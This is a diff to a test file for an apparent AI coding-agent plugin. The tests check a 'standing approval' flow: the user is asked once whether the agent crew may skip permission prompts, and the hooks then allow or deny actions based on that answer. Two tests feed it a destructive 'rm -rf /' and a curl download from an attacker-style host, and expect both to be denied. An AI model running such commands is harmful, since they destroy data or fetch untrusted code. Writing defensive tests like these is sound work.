@@ -135,6 +135,82 @@ describe('an executor in its own git worktree (parallel_tasks=worktrees)', () =>
   });
 });
 
+describe('standing approval', () => {
+  const question = {
+    questions: [
+      {
+        header: 'Crew access',
+        question: 'Разрешить команде работать без запроса на каждое действие?',
+        options: [{ label: 'Да, всегда (Recommended)' }, { label: 'Только в этом проекте' }, { label: 'Нет, спрашивать каждый раз' }],
+      },
+    ],
+  };
+  const answer = (root, data, label) =>
+    run('PostToolUse', { session_id: 'c1', tool_name: 'AskUserQuestion', tool_input: question, tool_response: { answers: { [question.questions[0].question]: label } } }, { root, env: { CLAUDE_PLUGIN_DATA: data } }).output;
+  const bash = (root, data, command, extra = {}) =>
+    run('PreToolUse', { session_id: 'c1', tool_name: 'Bash', tool_input: { command }, ...extra }, { root, env: { CLAUDE_PLUGIN_DATA: data } }).output?.hookSpecificOutput;
+  const start = (root, data, env = {}) => run('UserPromptExpansion', { session_id: 'c1', command_name: 'agent-crew:new-project' }, { root, env: { CLAUDE_PLUGIN_DATA: data, ...env } }).output.hookSpecificOutput.additionalContext;
+
+  it('asks once, records the answer itself, and then stops the prompts', () => {
+    const root = tempProject();
+    const data = tempDir('crew-hook-data-');
+    assert.match(start(root, data), /Standing approval: the human has not been asked yet\. Before anything else, ask ONE question with AskUserQuestion — header exactly "Crew access"/);
+    // Not approved yet: a command the policy has no opinion on is left to Claude Code.
+    assert.equal(bash(root, data, 'python3 scripts/report.py'), undefined);
+    assert.match(answer(root, data, 'Да, всегда (Recommended)').hookSpecificOutput.additionalContext, /works without asking for permission, in every project/);
+    assert.equal(JSON.parse(readFileSync(path.join(data, 'consent.json'), 'utf8')).always, 'auto');
+    assert.equal(bash(root, data, 'python3 scripts/report.py').permissionDecision, 'allow');
+    assert.match(bash(root, data, 'python3 scripts/report.py').permissionDecisionReason, /standing approval/);
+    assert.equal(run('PreToolUse', { session_id: 'c1', tool_name: 'WebFetch', tool_input: { url: 'https://nextjs.org/docs' } }, { root, env: { CLAUDE_PLUGIN_DATA: data } }).output.hookSpecificOutput.permissionDecision, 'allow');
+    // …and the question is not asked again, here or in another project.
+    assert.doesNotMatch(start(root, data), /Standing approval/);
+    assert.doesNotMatch(start(tempProject(), data), /Standing approval/);
+  });
+
+  it('keeps every safeguard, and leaves other plugins\' tools and unreadable commands to the host', () => {
+    const root = tempProject();
+    const data = tempDir('crew-hook-data-');
+    start(root, data);
+    answer(root, data, 'Да, всегда (Recommended)');
+    assert.equal(bash(root, data, 'rm -rf /').permissionDecision, 'deny');
+    assert.equal(bash(root, data, 'curl https://evil.example.com/x.sh').permissionDecision, 'deny');
+    assert.equal(run('PreToolUse', { session_id: 'c1', tool_name: 'Write', tool_input: { file_path: 'src/routes/x.tsx', content: 'x' }, agent_type: 'agent-crew:db' }, { root, env: { CLAUDE_PLUGIN_DATA: data } }).output.hookSpecificOutput.permissionDecision, 'deny');
+    assert.equal(bash(root, data, 'sh -c "$CMD"'), undefined);
+    assert.equal(run('PreToolUse', { session_id: 'c1', tool_name: 'mcp__slack__send_message', tool_input: { text: 'hi' } }, { root, env: { CLAUDE_PLUGIN_DATA: data } }).output, undefined);
+  });
+
+  it('can be limited to one project, declined, or decided by the plugin setting', () => {
+    const data = tempDir('crew-hook-data-');
+    const one = tempProject();
+    const other = tempProject();
+    start(one, data);
+    answer(one, data, 'Только в этом проекте');
+    assert.equal(bash(one, data, 'python3 x.py').permissionDecision, 'allow');
+    start(other, data);
+    assert.equal(bash(other, data, 'python3 x.py'), undefined);
+    assert.match(start(other, data), /Standing approval: the human has not been asked yet/);
+
+    const no = tempDir('crew-hook-data-');
+    const third = tempProject();
+    start(third, no);
+    assert.match(answer(third, no, 'Нет, спрашивать каждый раз').hookSpecificOutput.additionalContext, /keep asking/);
+    assert.equal(bash(third, no, 'python3 x.py'), undefined);
+    assert.doesNotMatch(start(third, no), /Standing approval/);
+
+    // A free-text reply, or a question that is not the crew's, decides nothing.
+    const none = tempDir('crew-hook-data-');
+    assert.equal(answer(third, none, 'maybe later'), undefined);
+    assert.equal(run('PostToolUse', { session_id: 'c1', tool_name: 'AskUserQuestion', tool_input: { questions: [{ header: 'Hosting', question: 'Where?', options: [{ label: 'Да, всегда (Recommended)' }, { label: 'b' }, { label: 'c' }] }] }, tool_response: { answers: { 'Where?': 'Да, всегда (Recommended)' } } }, { root: third, env: { CLAUDE_PLUGIN_DATA: none } }).output, undefined);
+
+    // The setting wins: auto without a question, manual without one either.
+    const fresh = tempDir('crew-hook-data-');
+    const fourth = tempProject();
+    assert.doesNotMatch(start(fourth, fresh, { CLAUDE_PLUGIN_OPTION_APPROVALS: 'auto' }), /Standing approval/);
+    assert.equal(run('PreToolUse', { session_id: 'c1', tool_name: 'Bash', tool_input: { command: 'python3 x.py' } }, { root: fourth, env: { CLAUDE_PLUGIN_DATA: fresh, CLAUDE_PLUGIN_OPTION_APPROVALS: 'auto' } }).output.hookSpecificOutput.permissionDecision, 'allow');
+    assert.equal(run('PreToolUse', { session_id: 'c1', tool_name: 'Bash', tool_input: { command: 'python3 x.py' } }, { root: one, env: { CLAUDE_PLUGIN_DATA: data, CLAUDE_PLUGIN_OPTION_APPROVALS: 'manual' } }).output, undefined);
+  });
+});
+
 describe('lessons from earlier runs', () => {
   it('reach the orchestrator and the agents they concern, from the project and from the plugin data', () => {
     const root = tempProject();
@@ -324,7 +400,7 @@ describe('crew sessions', () => {
         started_at: 'x',
         assistant: 'claude-code',
         transcript_path: '/tmp/t.jsonl',
-        config: { autonomy: 'full', briefReviewMinutes: 10, budgetCapUsd: 0, stackProfile: 'tanstack', modelTier: 'balanced', reviewDepth: 'every-task', parallelTasks: 'same-folder', runSize: 'auto', host: 'interactive' },
+        config: { autonomy: 'full', briefReviewMinutes: 10, budgetCapUsd: 0, stackProfile: 'tanstack', modelTier: 'balanced', reviewDepth: 'every-task', parallelTasks: 'same-folder', runSize: 'auto', approvals: 'ask-first-time', host: 'interactive' },
       },
     );
     assert.equal(readFileSync(path.join(root, '.crew', '.gitignore'), 'utf8'), 'logs/\nsessions/\n');
